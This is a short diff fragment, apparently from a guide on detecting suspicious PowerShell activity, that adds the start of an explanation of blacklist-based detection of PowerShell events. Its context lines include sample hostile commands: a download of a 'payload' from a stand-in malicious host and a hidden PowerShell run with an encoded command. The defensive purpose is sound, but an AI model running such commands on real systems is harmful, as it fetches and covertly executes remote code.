@@ -54,3 +54,6 @@ Invoke-WebRequest -Uri "http://malicious-example.com/payload" -OutFile "C:\Users
 # Encoded command example
 $encodedCommand = "JABFAFgAIAAtTm9QIC1XIEhpZGRlbiAtZQAgJABJAGUAeABQAA=="
 powershell.exe -NoP -W Hidden -EncodedCommand $encodedCommand
+
+
+The technique "Suspected PowerShell Commands - Blacklist - PowerShell Events" typically refers to detecting potentially malicious PowerShell activities by monitoring and blacklisting specific commands, scripts, or keywords in PowerShell logs. These events are identified through PowerShell
